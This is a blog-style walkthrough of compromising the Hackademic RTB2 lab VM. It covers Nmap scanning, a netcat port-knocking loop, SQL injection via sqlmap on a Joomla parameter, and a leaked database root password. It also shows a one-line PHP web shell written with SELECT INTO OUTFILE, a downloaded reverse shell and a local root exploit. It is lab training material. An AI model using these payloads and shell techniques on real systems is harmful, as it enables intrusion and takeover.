I ran OpenVAS, Dirbuster and Nikto on the target, but nothing more was uncovered other than a Phpmyadmin interface, which kept giving me &ldquo;unable to connect to MySQL server&rdquo; errors no matter what I did. I assumed that maybe the web server is a false front and that might be something else hidden on the machine, so I ran a UDP scan next, which revealed an additional port:</p>

<p><code>plain
nmap -sU -F -n -T4 192.168.80.166
PORT     STATE SERVICE  REASON
5353/udp open  zeroconf udp-response ttl 255
</code></p>

<p>Further internet research and a version scan implied that this was the <a href="https://en.wikipedia.org/wiki/Multicast_DNS">Multicast DNS</a> protocol. I couldn&rsquo;t find anything to exploit it, though. But it made me want to take a closer look at Nmap&rsquo;s results again, so I ran another scan:</p>

<p>``` plain
nmap  -p- 192.168.80.166</p>

<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-07-21 08:14 EDT
Nmap scan report for 192.168.80.166
Host is up, received arp-response (0.00024s latency).

Reason: 65533 resets and 1 port-unreach
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```</p>

<p>This time I read it more carefully and I noticed it reported a filtered port. I ran Nmap again with the verbose flags and <code>&mdash;packet-trace</code> option and this time it returned a new port:</p>

<p><code>plain
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 64
666/tcp open  doom    syn-ack ttl 64
</code></p>

<p>This must have been the previously reported as filtered port. Version scanning revealed that this was actually another web server!</p>

<p><code>plain
666/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.14 ((Ubuntu))
</code></p>

<p>Before continuing, I am taking a detour here because it seems I had bypassed a secion of the challenge. When I came back to resume working on this VM, I couldn&rsquo;t get the 666 port to open, and I had no idea what triggered it. I looked at g0tmi1lk&rsquo;s video and it turns out there is a SQLi string that you can insert into the password field of the first web server that gives you a different response. The string is <code>&lsquo; or 1=1&mdash;&rsquo;</code>. I previously tested this parameter with sqlmap and also inserting another variation of this string, with no satisfactory answer. I assumed maybe it&rsquo;s hardcoded, because the slightest change, as in putting a space after the comment character invalidates it. Anyway, with this injection attempt you are taken to a page that says &ldquo;Ok, nice shot&hellip;&hellip;but, you are looking in a wrong place bro! ;&ndash;)&rdquo;. In the source, there was a URL encoded string:</p>

<p><code>plain

<p>After decoding the hex string, I got this message:</p>

<p>Alright, this is a reference to <a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a>. I further decoded the binary data to ascii by using <a href="http://www.snarkles.net/scripts/sneak/sneak.php">this site</a> and got the string <em>1001:1101:1011:1001</em>. So I assumed this string will need to be given to the host in order to open up the port.</p>

<p>``` plain</p>

<h1>!/bin/bash</h1>

<p>for i in 1001 1101 1011 1001
do
nc 192.168.80.167 80 $i
done
```</p>

<p>Indeed, now the 666 port was opened. Not sure how I previously got to it without going through the sequence</p>

<p><img class="center" src="/images/pentest/hackademic/rtb2-hidden.png" title="&lsquo;hidden web server&rsquo; &lsquo;hidden web server&rsquo;" ></p>

<p>Ok, back to hacking! First thing I noticed was a really old Joomla version, so I fired up <code>joomscan</code> and among the 4 vulnerabilities found, I show here one that seemed more interesting:</p>

<p><code>plain
Info -&gt; CorePlugin: TinyMCE TinyBrowser addon multiple vulnerabilities
Versions effected: Joomla! 1.5.12
Check: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/

Vulnerable? Yes
</code></p>

<p>Ok, let&rsquo;s keep this in mind and continue looking. I ran Nikto against this new web server and it reported entries in robots.txt!</p>

<p><code>plain

</code></p>

<h1>Exploit</h1>

<p>I visited those directories but there was nothing interesting. The administrator one contained a message stating that I am not the real administrator. So I went back to testing for SQLi in the login page and in the URL parameters. In particular, I was interested by the <em>Itemid</em> parameter. When I tampered with it, I got messages that I need to login to view that area of the site. I used sqlmap but no vulnerability found. Seeing so many parameters in the URL, I decided to test each one of them by visiting every page and trying a single quote in every parameter. And the jackpot was found at the <code>letter</code> parameter in the List contents page:</p>

<p>``` plain
<a href="http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3">http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3</a></p>

<p>Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;%&rsquo; GROUP BY title ORDER BY title' at line 1 SQL=SELECT id, title FROM jos_content WHERE state = 1 AND UPPER(title) LIKE &lsquo;&rsquo;%&lsquo; GROUP BY title ORDER BY title
&rsquo;
```</p>

<p>With this information, I pointed sqlmap to the vulnerable parameter and retrieved the jos_users table of the joomla database, where among others, there were usernames and password hashes</p>

<p><code>plain
username    usertype    password

</code></p>

<p>Well, these hashes won&rsquo;t help much, as a quick search didn&rsquo;t give me any way to crack them fast and easy. I did research a bit on the internet and found out that these are salted hashes, stored in the format <code>md5 hash:salt</code>. I also found there is a Perl script that can help with cracking such hashes, called <a href="http://morxploit.com/joomlacrack.txt">joomlacrack.pl</a>. But I thought I might not need to crack them if I could use sqlmap to execute commands on the server and write a PHP backdoor there. So that&rsquo;s what I tried next. Passing <em>pwd</em> to <em>&mdash;os-cmd</em> gave me the location of the current directory, which is /var/www. I tried writing a shell directly in this location but I failed. So next I listed the contents of the present directory and noticed a <em>configuration.php</em> file that I read, and inside there were credentials for the database:</p>

<p><code>plain
/* Database Settings */
var $dbtype = 'mysql';
var $host = 'localhost';
var $user = 'root';
var $password = 'yUtJklM97W';
var $db = 'joomla';
var $dbprefix = 'jos_';
</code></p>

<p>I went to the phpmyadmin interface and logged in as root. Then I was able to use SQL to create a rudimentary shell:</p>

<p><code>sql
SELECT
"&lt;? system($_REQUEST['cmd']); ?&gt;"
INTO OUTFILE "/var/www/cmd.php";
</code></p>

<p>After uploading this shell, I used to download the reverse PHP shell that I hosted with Python&rsquo;s SimpleHTTPServer. And then I navigated to it and received the connection on my Netcat listener:</p>

<p><code>plain
Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux

uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
</code></p>

<p>The local exploit that worked was the same one I used in the previous Hackademic challenge, the <a href="https://www.exploit-db.com/exploits/15285/">RDS Protocol Local Privilege Escalation exploit</a>. Again, I used wget to download it from my machine and ran it:</p>

<p><code>plain
[snipped]
[*] Restoring function pointer...
id
uid=0(root) gid=0(root)
ls /root/
Desktop
Key.txt
</code></p>

<p>Trying to read the key gave a huge base64 encoded string, so I copied it to the web server directory, gave it permissions for everyone, and then I downloaded it on my machine, where I could decode it:</p>

<p><code>plain
root@pwnbox:~/Downloads#base64 -d key.txt &gt; decoded
root@pwnbox:~/Downloads#file decoded
decoded: PNG image data, 756 x 344, 8-bit/color RGB, non-interlaced
</code></p>

<p>So it&rsquo;s an image! (when I tried reading it there was binary garbage, so I assumed it must be another type of file than a text one). I used this <a href="http://codebeautify.org/base64-to-image-converter">base64 to image converter</a> to see the image:</p>

<p><img class="center" src="/images/pentest/hackademic/rtb2-win.png" title="&lsquo;hackademic rtb2&rsquo; &lsquo;hackademic rtb 2 finished&rsquo;" ></p>

<h1>Debriefing</h1>

<p>This host implemented a sneaky defense of port knocking in order to serve the second web server. It was a bit unrealistic to require a hardcoded value for the password parameter on the first web server in my opinion. The second server was vulnerable to real SQL injection that could read files on the system and execute commands. Having the database root credentials readily available allowed me to gain a foothold on the machine, from which the only step left was finding an exploit that would give me root.</p>
